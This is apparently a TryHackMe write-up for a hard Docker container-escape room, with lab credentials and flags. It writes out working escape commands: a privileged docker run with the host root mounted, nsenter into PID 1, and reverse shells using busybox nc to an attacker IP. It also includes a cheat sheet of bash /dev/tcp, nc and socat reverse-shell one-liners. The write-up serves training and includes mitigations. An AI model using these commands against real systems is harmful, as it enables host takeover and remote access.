# Matryoshka - TryHackMe Hard Machine

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
![Category](https://img.shields.io/badge/Category-Docker%20Escape-blue)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen)

## Machine Information

| Property | Value |
|----------|-------|
| **Machine Name** | Matryoshka |
| **Platform** | TryHackMe |
| **Difficulty Level** | Hard |
| **Category** | Container Escape / Privilege Escalation |
| **IP Address** | `10.48.133.6` |
| **Release Date** | October 2026 |
| **Objective** | Escape nested Docker containers to reach host system |

## Executive Summary

Matryoshka is an advanced container escape challenge featuring multiple nested Docker containers that must be escaped sequentially. The machine demonstrates critical Docker security misconfigurations including privileged container execution, namespace escaping via `nsenter`, and mounted socket exploitation. The attack path involves three distinct privilege escalation stages, culminating in root access to the host EC2 instance.

**Key Attack Vectors:**
- Docker socket discovery and enumeration
- Privileged container spawning with namespace access
- `nsenter` namespace escaping technique
- Reverse shell establishment through container layers
- Host filesystem access via volume mounts

---

## Initial Access

### SSH Connection to Container 1

```bash
ssh matryoshka@10.48.133.6
# Password: n03sk@p3
```

**Initial Session:**
```
21fd260330df:~$ whoami
matryoshka

21fd260330df:~$ id
uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)

21fd260330df:~$ hostname
21fd260330df
```

---

## Stage 1: Container Detection & Enumeration

### Identifying the Docker Environment

#### Method 1: Check for `.dockerenv` file

```bash
ls -la / | grep dockerenv
-rwxr-xr-x   1 root root    0 Oct  9 02:33 .dockerenv
```

The presence of `/.dockerenv` file confirms execution within a Docker container.

#### Method 2: Control Groups Inspection

```bash
cat /proc/1/cgroup
```

Look for `docker` or container identifiers in the cgroup path.

#### Method 3: Python Detection Script

```python
import os

def is_docker():
    # Check 1: Existence of the /.dockerenv file
    if os.path.exists('/.dockerenv'):
        return True
    
    # Check 2: Control groups check
    try:
        with open('/proc/1/cgroup', 'rt') as f:
            if 'docker' in f.read():
                return True
    except Exception:
        pass
        
    return False

print("Is Docker:", is_docker())
# Output: Is Docker: True
```

### Docker Socket Discovery

Search for the Docker daemon socket, which is the critical escape vector:

```bash
find / -name "docker.sock" 2>/dev/null
/run/docker.sock
```

**Critical Finding:** The Docker socket is accessible from within the container, allowing container manipulation and privilege escalation.

### Docker Image Enumeration

```bash
docker images
```

**Output:**
```
REPOSITORY          TAG       IMAGE ID       CREATED        SIZE
matryoshka-level1   local     485e908211ec   5 months ago   43.9MB
alpine              3.20      bf8527eb54c3   5 months ago   7.8MB
```

**Available Images:**
1. `matryoshka-level1:local` - Custom challenge image
2. `alpine:3.20` - Lightweight Linux distro (7.8MB)

---

## Stage 2: Privileged Container Escape (Flag 2)

### Exploiting Privileged Alpine Container

The Alpine image can be spawned with elevated privileges to escape the current container context.

#### Privileged Container Spawn

```bash
docker run -it --rm --privileged --pid=host --net=host \
  -v /:/host alpine:3.20 chroot /host /bin/sh
```

**Flags Breakdown:**
- `--privileged`: Grants full access to host devices and capabilities
- `--pid=host`: Shares host's PID namespace (allows access to host processes)
- `--net=host`: Shares host's network namespace
- `-v /:/host`: Mounts host's root filesystem at `/host`
- `chroot /host /bin/sh`: Changes root to host filesystem and spawns shell

#### Shell Access in Host Context

```
/ # ls
bin    dev  home  media  opt   root  sbin  sys  usr
certs  etc  lib   mnt    proc  run   srv   tmp  var

/ # cd /root
/ # ls -la
total 48
drwx------  5 root root 4096 Oct  9 02:33 .
drwxr-xr-x 19 root root 4096 Oct  9 02:33 ..
-rw-r--r--  1 root root  220 Nov 23  2024 .bash_logout
-rw-r--r--  1 root root 3771 Nov 23  2024 .bashrc
-rw-r--r--  1 root root  807 Nov 23  2024 .profile
-rw-r--r--  1 root root  0   Oct  9 02:33 .dockerenv
-rw-r--r--  1 root root  48  Oct  9 02:32 flag_level2.txt
```

#### Flag 2 Recovery

```bash
cat /root/flag_level2.txt
THM{PRIVILEGED_ESCAPE_L2}
```

**Flag 2 Obtained:** `THM{PRIVILEGED_ESCAPE_L2}`

---

## Stage 3: Shared Volume Exploitation (Flag 3)

### Mounted Shared Directory Discovery

The host system shares a directory at `/mnt/level3share` for inter-container communication.

#### Directory Structure

```bash
cd /mnt
ls -lah
```

**Output:**
```
total 12K
drwxr-xr-x 1 root root 4.0K Oct  9 02:33 .
drwxr-xr-x 1 root root 4.0K Oct  9 02:33 ..
drwxrwxrwx 4 root root 4.0K Oct  9 02:32 level3share
```

#### Inbox & Outbox Directories

```bash
cd /mnt/level3share
ls -la
```

**Output:**
```
total 12K
drwxrwxrwx 4 root root 4.0K Oct  9 02:32 .
drwxrwxrwx 4 root root 4.0K Oct  9 02:32 ..
drwxrwxrwx 2 root root 4.0K Oct  9 02:32 inbox
drwxrwxrwx 2 root root 4.0K Oct  9 02:32 outbox
```

**Purpose:**
- `inbox/`: Writable directory for placing exploit scripts
- `outbox/`: Output directory where execution results are written

### Script Injection & Execution

#### Reverse Shell Script Generation

Create a bash script that establishes a reverse shell to the attacker's machine:

```bash
cat > /mnt/level3share/inbox/pwn.sh << 'EOF'
#!/bin/bash
busybox nc 10.48.101.239 4444 -e bash
EOF
```

**Script Explanation:**
- Uses `busybox nc` (netcat) for minimal dependencies
- Establishes reverse TCP connection to attacker IP `10.48.101.239` on port `4444`
- `-e bash` executes bash shell through the connection

#### Script Execution Trigger

The container runner automatically executes scripts placed in the `inbox/` directory and redirects output to `outbox/pwn.sh.out`.

#### Reverse Shell Reception

```bash
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.133.6 37215
```

#### Flag 3 Retrieval

```bash
ls
bin    dev  home  media  opt   root  sbin  sys  usr
certs  etc  lib   mnt    proc  run   srv   tmp  var

cd /root
ls
flag_level3.txt  flag_level2.txt

cat flag_level3.txt
THM{L3V3L_3_SCAPE}
```

**Flag 3 Obtained:** `THM{L3V3L_3_SCAPE}`

---

## Stage 4: Host System Escape via nsenter (Final Flag)

### Advanced Container Enumeration

The second Docker container (Level 3) is spawned with `--privileged --pid=host`, allowing access to host namespaces.

#### Container Information Gathering Script

```bash
cat > /mnt/level3share/inbox/pwn.sh << 'EOF'
#!/bin/sh
# Level 3 container has --privileged --pid=host flags
# This means PID 1 in this container is the EC2 host's init
# We can use nsenter to enter the host's namespaces

# System information
echo "=== System Information ==="
whoami
id
hostname
uname -a

# Check for cgroup indicators
echo ""
echo "=== Cgroup Information ==="
cat /proc/1/cgroup

# Docker socket availability
echo ""
echo "=== Docker Socket Check ==="
ls -la /run/docker.sock 2>/dev/null || echo "Docker socket not found"

# Mount points
echo ""
echo "=== Mount Points ==="
mount | grep -E "overlay|tmpfs"

# Network interfaces
echo ""
echo "=== Network Interfaces ==="
ip link show

# Running processes
echo ""
echo "=== Running Processes ==="
ps aux | head -20

# Search for flags
echo ""
echo "=== Flag Search ==="
find / -name "flag*.txt" 2>/dev/null
EOF
chmod +x /mnt/level3share/inbox/pwn.sh
```

### Namespace Escape using nsenter

The `nsenter` command is used to enter the namespaces of PID 1 (the host's init process) and execute commands within the host context.

#### nsenter Escape Script

```bash
cat > /mnt/level3share/inbox/pwn.sh << 'EOF'
#!/bin/sh
# Level 3 has --privileged --pid=host, so PID 1 here is the EC2 host's init.
# nsenter into all of PID 1's namespaces to break out onto the host.
nsenter -t 1 -a -- sh -c 'busybox nc 10.48.101.239 4444 -e bash'
EOF
chmod +x pwn.sh
```

**nsenter Command Breakdown:**
```
nsenter -t 1 -a -- sh -c 'COMMAND'
├── nsenter              : Enter namespaces utility
├── -t 1                 : Target PID 1 (host init process)
├── -a                   : Enter all namespace types (IPC, UTS, NET, PID, MNT, USER)
├── --                   : Stop parsing options
├── sh -c 'COMMAND'      : Execute command in host context
└── 'busybox nc ...'     : Establish reverse shell to attacker
```

#### Reverse Shell Reception from Host

```bash
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.133.6 34478
```

#### Host System Access

```bash
pwd
/root

ls -la
total 48
drwx------  5 root root 4096 Oct  9 02:33 .
drwxr-xr-x 19 root root 4096 Oct  9 02:33 ..
-rw-r--r--  1 root root  220 Nov 23  2024 .bash_logout
-rw-r--r--  1 root root 3771 Nov 23  2024 .bashrc
-rw-r--r--  1 root root  807 Nov 23  2024 .profile
drwxr-xr-x  3 root root 4096 Oct  9 02:30 snap
-rw-r--r--  1 root root  29  Oct  9 02:31 flag_host.txt

whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

#### Final Flag Retrieval

```bash
cat /root/flag_host.txt
THM{SP@C3D_0UT}
```

**Final Flag Obtained:** `THM{SP@C3D_0UT}`

---

## Complete Attack Chain

```
SSH Access to Container 1 (matryoshka:n03sk@p3)
        ↓
Container Detection (/.dockerenv, /proc/1/cgroup)
        ↓
Docker Socket Discovery (/run/docker.sock)
        ↓
Docker Image Enumeration (alpine:3.20 available)
        ↓
STAGE 1: Privileged Alpine Container Spawn
        ├── docker run --privileged --pid=host --net=host
        ├── Mount host filesystem (-v /:/host)
        ├── chroot to host context
        └── Flag 2: THM{PRIVILEGED_ESCAPE_L2}
        ↓
STAGE 2: Shared Volume Exploitation
        ├── Discover /mnt/level3share (inbox/outbox)
        ├── Create reverse shell script
        ├── Place in inbox/ directory
        ├── Container runner executes script
        └── Flag 3: THM{L3V3L_3_SCAPE}
        ↓
STAGE 3: nsenter Namespace Escape
        ├── Target PID 1 (host init process)
        ├── Use nsenter -t 1 -a to escape namespaces
        ├── Execute shell in host context
        ├── Achieve root access
        └── Flag 4: THM{SP@C3D_0UT}
        ↓
Host System Pwned ✓
```

---

## Docker Security Vulnerabilities Exploited

### 1. **Accessible Docker Socket**

**Vulnerability:** Docker socket is readable/writable from within the container.

```bash
ls -la /run/docker.sock
srw-rw---- 1 root docker 0 Oct  9 02:33 /run/docker.sock
```

**Impact:** Allows arbitrary Docker container operations, image enumeration, and container spawning.

**Mitigation:**
- Do not mount Docker socket into untrusted containers
- Remove Docker socket from container rootfs
- Use socket restrictions and access controls

### 2. **Privileged Container Execution**

**Vulnerability:** Docker containers run with `--privileged` flag in production.

```bash
docker run --privileged ...
```

**Impact:**
- Full access to host devices (/dev/*)
- Capabilities manipulation (CAP_SYS_ADMIN, etc.)
- Namespace escape vectors available
- Direct filesystem access via mounts

**Mitigation:**
- Never use `--privileged` unless absolutely necessary
- Use specific capabilities instead (`--cap-add=CAP_NET_ADMIN`)
- Implement default seccomp and AppArmor profiles

### 3. **Shared Namespace Exposure**

**Vulnerability:** `--pid=host` and `--net=host` flags share namespaces with host.

```bash
docker run --pid=host --net=host ...
```

**Impact:**
- Processes in container can access host processes
- Network isolation is completely removed
- PID 1 is the host's init (not container's init)

**Mitigation:**
- Use separate namespaces by default
- Only share namespaces when required for legitimate purposes
- Implement network policies and namespace restrictions

### 4. **Writable Volume Mounts**

**Vulnerability:** Host directories mounted as world-writable to containers.

```
/mnt/level3share  drwxrwxrwx
```

**Impact:**
- Containers can write arbitrary files to host
- Script injection via mounted directories
- Privilege escalation through shared volumes

**Mitigation:**
- Mount volumes as read-only when possible (`-v /path:ro`)
- Restrict permissions on mounted directories (chmod 755 or more restrictive)
- Validate and sanitize all files placed in mounted directories

### 5. **nsenter Availability**

**Vulnerability:** `nsenter` utility available in privileged container.

**Impact:**
- Direct namespace escape to host
- Root access via PID 1 namespace access
- Complete host system compromise

**Mitigation:**
- Remove `nsenter` and similar tools from container images
- Use `--cap-drop=ALL` and selectively add required capabilities
- Implement seccomp profiles that prevent namespace operations

---

## Docker Escape Techniques Summary

### Technique 1: Privileged Container + Volume Mount

**Conditions:**
- Container runs with `--privileged` flag
- Host filesystem mounted via `-v /:/mount`

**Execution:**
```bash
docker run -it --privileged -v /:/host alpine chroot /host /bin/sh
```

**Difficulty:** Low | **Reliability:** Very High

### Technique 2: Docker Socket Exploitation

**Conditions:**
- Docker socket is mounted/accessible (`/run/docker.sock`)
- Docker CLI is available in container

**Execution:**
```bash
docker run --rm -v /:/host alpine chroot /host /bin/sh
```

**Difficulty:** Low | **Reliability:** Very High

### Technique 3: nsenter Namespace Escape

**Conditions:**
- Container runs with `--pid=host` flag
- `nsenter` utility is available
- Container has necessary capabilities

**Execution:**
```bash
nsenter -t 1 -a -- /bin/bash
```

**Difficulty:** Medium | **Reliability:** High

### Technique 4: Cgroup Device Escape

**Conditions:**
- Device cgroup is misconfigured
- Direct block device access possible

**Execution:**
```bash
# Access /dev/sda from container
dd if=/dev/sda of=backup.img
```

**Difficulty:** High | **Reliability:** Medium

---

## Tools & Commands Reference

### Docker Reconnaissance
```bash
# List available images
docker images

# Inspect Docker daemon
docker info

# List running containers
docker ps

# Check image details
docker inspect <image_id>

# Pull additional images
docker pull <image>:<tag>
```

### Container Spawning
```bash
# Basic container execution
docker run -it <image> /bin/sh

# Privileged container with full host access
docker run -it --privileged --pid=host --net=host \
  -v /:/host <image> chroot /host /bin/sh

# Minimal container (read-only filesystem)
docker run -it --read-only --cap-drop=ALL <image> /bin/sh
```

### Namespace Escaping
```bash
# Enter all namespaces of PID 1
nsenter -t 1 -a -- /bin/bash

# Enter specific namespaces
nsenter -t <PID> -p -- /bin/bash    # PID namespace
nsenter -t <PID> -n -- /bin/bash    # Network namespace
nsenter -t <PID> -m -- /bin/bash    # Mount namespace

# Execute command in namespace
nsenter -t 1 -a -- sh -c 'command'
```

### Reverse Shell Generation
```bash
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Busybox netcat
busybox nc ATTACKER_IP PORT -e bash

# nc (netcat)
nc -e /bin/bash ATTACKER_IP PORT

# socat
socat exec:/bin/bash tcp:ATTACKER_IP:PORT
```

### Listener Setup
```bash
# nc listener
nc -lvnp PORT

# With rlwrap (line editing)
rlwrap nc -lvnp PORT

# bash listener
bash -i >& /dev/tcp/0.0.0.0/PORT 0>&1 &
```

---

## Key Takeaways

### 1. **Container Isolation is Not Optional**
   - Properly isolated containers prevent privilege escalation
   - Shared namespaces (PID, NET) create escape vectors
   - Default deny principle for capabilities

### 2. **Privilege Escalation is Multiplicative**
   - Each security misconfiguration compounds vulnerability
   - Combined misconfigurations create exploitable conditions
   - Defense in depth is critical for container security

### 3. **Docker Socket is the Crown Jewel**
   - Access to Docker socket = arbitrary container execution
   - Never mount Docker socket into untrusted containers
   - Implement socket-level access controls

### 4. **Volume Mount Permissions Matter**
   - World-writable mounts enable script injection
   - Shared volumes can be used for privilege escalation
   - Read-only mounts prevent modification attacks

### 5. **Detection Evasion in Containers**
   - Multiple methods to verify container execution
   - Backup/copy files left on system indicate escape
   - File modification timestamps reveal execution timing

### 6. **Reverse Shell Stability**
   - Containers may have limited shells available
   - Busybox provides portable utilities across images
   - rlwrap improves interactive shell usability

### 7. **Staged Privilege Escalation**
   - Container escapes often require multiple stages
   - Each stage may leverage different vulnerabilities
   - Document assumptions about available tools/privileges

### 8. **Namespace Isolation Mechanisms**
   - PID namespace: Process isolation
   - NET namespace: Network stack isolation
   - MNT namespace: Filesystem mount isolation
   - UTS namespace: Hostname/domain isolation

### 9. **Container Runtime Security**
   - Seccomp profiles restrict system calls
   - AppArmor/SELinux provide MAC enforcement
   - Capability dropping removes dangerous features
   - Read-only rootfs prevents persistence

### 10. **Lateral Movement in Container Infrastructure**
   - Compromise of one container ≠ game over
   - Shared resources (volumes, networks) enable lateral movement
   - Orchestration platforms (Kubernetes) require additional hardening

---

## Defense Strategy

### Immediate Hardening

```bash
# Do NOT use these in production:
# ❌ docker run --privileged
# ❌ docker run --pid=host
# ❌ docker run --net=host
# ❌ -v /:/container

# Instead, use:
# ✓ docker run --read-only
# ✓ docker run --cap-drop=ALL
# ✓ docker run --cap-add=CAP_REQUIRED
# ✓ -v /path/to/data:/data:ro
```

### Dockerfile Security Best Practices

```dockerfile
# Use minimal base images
FROM alpine:latest

# Drop capabilities
RUN setcap -r $(which busybox)

# Create non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Use read-only filesystem
RUN chmod u-w /

# Avoid packages that enable escapes
RUN apk del --no-cache sudo nsenter strace
```

### Docker Daemon Configuration

```json
{
  "icc": false,
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 1024,
      "Soft": 1024
    }
  },
  "storage-driver": "overlay2",
  "log-driver": "json-file"
}
```

### Runtime Security Policies

- Implement Pod Security Policies (Kubernetes)
- Use seccomp profiles for system call filtering
- Apply AppArmor/SELinux mandatory access control
- Enable audit logging for container operations

---

---

## References

- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [OWASP: Container Security](https://owasp.org/www-project-container-security/)
- [Linux Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [nsenter Manual](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [Docker Escape Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout)
- [Container Escape Vulnerabilities](https://www.bleepingcomputer.com/articles/docker-vulnerabilities/)

---

**Jai Shri Ram**
**Write-up Completed:** October 9, 2026  
**Machine Status:** ✓ Pwned (Host Root Access Achieved)  
**Difficulty Assessment:** Hard - Multi-stage container escape requiring namespace exploitation and privilege escalation through Docker security misconfigurations
